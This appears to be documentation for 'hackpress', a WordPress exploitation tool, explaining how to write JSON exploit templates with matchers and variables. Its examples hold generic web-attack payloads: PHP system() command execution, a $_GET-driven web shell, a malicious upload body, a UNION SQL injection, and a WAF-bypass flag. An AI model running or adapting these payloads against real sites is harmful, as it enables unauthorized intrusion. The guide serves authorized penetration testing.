# Exploit Templates Guide

This guide provides detailed documentation for creating exploit templates in hackpress.

## What are Exploit Templates?

Exploit templates execute actual exploits against WordPress installations. These templates are **potentially destructive** and should only be used:

- On systems you own or have explicit permission to test
- For confirmed vulnerabilities
- With full understanding of the impact

## Execution Model

- **Single execution only** - One exploit template at a time
- **Required template path** - Must specify `--template <path>`
- **Command**: `hackpress exploit <url> --template <path>`

### Command Examples

```bash
# Basic exploit execution
hackpress exploit https://example.com --template templates/exploits/example-rce.json

# With WAF bypass
hackpress exploit https://example.com --template templates/exploits/example-rce.json --waf-bypass

# With verbose output
hackpress exploit https://example.com --template templates/exploits/example-rce.json --verbose

# Output to JSON format
hackpress exploit https://example.com --template templates/exploits/example-rce.json --output json

# Output to markdown format
hackpress exploit https://example.com --template templates/exploits/example-rce.json --output markdown > report.md
```

**Global Options Available:**
- `--output <format>` - Output format: `json`, `table` (default), or `markdown`
- `--verbose` - Enable verbose logging
- `--waf-bypass` - Enable WAF bypass with random user agents

## Template Structure

### Required Fields

```json
{
  "id": "unique-template-id",
  "info": {
    "name": "Template Name",
    "author": ["Author"],
    "severity": "critical|high|medium|low"
  },
  "http": [...]
}
```

### Complete Example

```json
{
  "id": "wordpress-plugin-rce-2023",
  "info": {
    "name": "WordPress Plugin RCE",
    "author": ["hackpress"],
    "severity": "critical",
    "description": "Remote code execution in plugin X version Y",
    "reference": ["CVE-2023-XXXXX", "https://example.com/advisory"],
    "tags": ["wordpress", "rce", "plugin"]
  },
  "variables": {
    "target": "{{target}}",
    "plugin_path": "/wp-content/plugins/vulnerable-plugin/"
  },
  "http": [
    {
      "method": "POST",
      "path": ["{{plugin_path}}ajax-handler.php"],
      "headers": {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      "body": "action=exploit&payload=<?php system('id'); ?>",
      "matchers": [
        {
          "type": "status",
          "status": [200]
        },
        {
          "type": "word",
          "words": ["uid=", "gid="],
          "part": "body"
        }
      ]
    }
  ]
}
```

## HTTP Request Configuration

### Method

Supported methods: `GET`, `POST`, `PUT`, `DELETE`

```json
{
  "method": "POST"
}
```

### Path

Path can be a single string or array (first element used):

```json
{
  "path": ["/wp-content/plugins/plugin/ajax.php"]
}
```

Variables are substituted in paths:

```json
{
  "path": ["{{plugin_path}}endpoint.php"]
}
```

### Headers

Custom headers can be specified:

```json
{
  "headers": {
    "Content-Type": "application/json",
    "X-Custom-Header": "value"
  }
}
```

### Body

Request body for POST/PUT requests:

```json
{
  "body": "param1=value1&param2=value2"
}
```

Or with variables:

```json
{
  "body": "action={{action}}&payload={{payload}}"
}
```

## Matchers

Matchers validate exploit success by checking response.

### Status Matcher

Match HTTP status codes:

```json
{
  "type": "status",
  "status": [200, 201, 302]
}
```

### Word Matcher

Match specific words in response:

```json
{
  "type": "word",
  "words": ["success", "executed", "uid="],
  "part": "body"
}
```

Parts:
- `body` - Response body
- `header` - Response headers
- `all` - Both body and headers

### Regex Matcher

Match regular expressions:

```json
{
  "type": "regex",
  "regex": ["uid=\\d+", "gid=\\d+"],
  "part": "body"
}
```

### Size Matcher

Match response size:

```json
{
  "type": "size",
  "size": [1024, 2048]
}
```

### Negative Matchers

Match when something should NOT be present:

```json
{
  "type": "word",
  "words": ["error", "failed"],
  "part": "body",
  "negative": true
}
```

## Multiple HTTP Requests

Chain multiple requests:

```json
{
  "http": [
    {
      "method": "GET",
      "path": ["/login.php"]
    },
    {
      "method": "POST",
      "path": ["/login.php"],
      "body": "user=admin&pass=test"
    },
    {
      "method": "GET",
      "path": ["/admin/exploit.php"]
    }
  ]
}
```

Each request can have its own matchers:

```json
{
  "http": [
    {
      "method": "POST",
      "path": ["/exploit.php"],
      "matchers": [
        {
          "type": "status",
          "status": [200]
        }
      ]
    }
  ]
}
```

## Variable Substitution

Variables are substituted in:
- Paths
- Headers
- Body content

Built-in variables:
- `{{target}}` - Target URL

Custom variables:

```json
{
  "variables": {
    "target": "{{target}}",
    "plugin_path": "/wp-content/plugins/my-plugin/",
    "payload": "<?php system('id'); ?>"
  }
}
```

## Common Exploit Patterns

### Pattern 1: Remote Code Execution

```json
{
  "http": [
    {
      "method": "POST",
      "path": ["/wp-content/plugins/plugin/rce.php"],
      "body": "cmd=<?php system($_GET['c']); ?>",
      "matchers": [
        {
          "type": "word",
          "words": ["uid=", "gid="],
          "part": "body"
        }
      ]
    }
  ]
}
```

### Pattern 2: File Upload

```json
{
  "http": [
    {
      "method": "POST",
      "path": ["/wp-admin/admin-ajax.php"],
      "headers": {
        "Content-Type": "multipart/form-data"
      },
      "body": "action=upload&file=<?php system('id'); ?>",
      "matchers": [
        {
          "type": "word",
          "words": ["uploaded", "success"],
          "part": "body"
        }
      ]
    }
  ]
}
```

### Pattern 3: SQL Injection

```json
{
  "http": [
    {
      "method": "GET",
      "path": ["/endpoint.php?id=1' UNION SELECT 1,2,3--"],
      "matchers": [
        {
          "type": "word",
          "words": ["2", "3"],
          "part": "body"
        }
      ]
    }
  ]
}
```

## Security Considerations

1. **Authorization** - Only use on systems you own or have permission to test
2. **Impact Assessment** - Understand what the exploit does before running
3. **Backup** - Consider backing up systems before testing
4. **Isolation** - Test in isolated environments when possible
5. **Documentation** - Document expected behavior and cleanup steps

## Best Practices

1. **Clear Descriptions** - Describe what the exploit does
2. **Severity Accuracy** - Match severity to actual impact
3. **References** - Include CVE numbers and advisory links
4. **Testing** - Test thoroughly before sharing
5. **Error Handling** - Use matchers to detect failures
6. **Payload Documentation** - Explain complex payloads in description

## Troubleshooting

### Exploit Not Executing

- Verify JSON syntax
- Check file path is correct
- Ensure all required fields present
- Check HTTP client errors

### Matchers Not Matching

- Inspect actual response content
- Verify matcher type and part
- Test with verbose output
- Check for case sensitivity

### Variable Issues

- Ensure variables are defined
- Check variable name spelling
- Verify substitution syntax `{{variable}}`

## Example Templates

See `templates/exploits/` directory for example templates.

## Related Documentation

- `TEMPLATE_TUTORIAL.md` - General template creation guide
- `VULN_TEMPLATES.md` - Vulnerability validation templates
